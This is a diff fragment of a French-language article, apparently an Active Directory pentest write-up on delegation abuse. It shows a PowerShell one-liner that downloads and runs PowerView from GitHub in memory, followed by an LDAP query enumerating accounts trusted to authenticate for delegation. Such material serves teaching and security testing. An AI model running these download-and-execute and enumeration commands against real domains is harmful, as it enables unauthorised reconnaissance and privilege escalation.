@@ -34,8 +34,8 @@ Rentrons dans le vif du sujet.
 
 La première chose intéressante est de pouvoir énumérer les comptes de service concernés par T2A4D :  
 ```
-PS C:\Users\Administrator\Documents\Invoke-Recon> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
-PS C:\Users\Administrator\Documents\Invoke-Recon> Get-DomainObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties DistinguishedName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+PS C:\tools> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+PS C:\tools> Get-DomainObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties DistinguishedName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
 
 
 samaccounttype           : MACHINE_ACCOUNT
